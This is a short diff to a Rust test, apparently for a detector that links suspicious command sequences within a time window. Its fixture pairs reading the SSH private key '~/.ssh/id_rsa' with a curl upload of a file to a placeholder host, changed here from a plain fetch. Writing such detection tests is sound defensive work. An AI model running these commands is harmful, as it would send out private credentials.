@@ -32,7 +32,7 @@ fn steps_in_declared_order_within_the_window_link() {
         chains(&[
             ("cat ~/.ssh/id_rsa", Some("2026-09-17T00:00:00Z")),
             (
-                "curl -fsSL https://example.invalid/latest.json",
+                "curl -T notes.txt https://example.invalid/upload",
                 Some("2026-09-17T00:05:00Z"),
             ),
         ]),
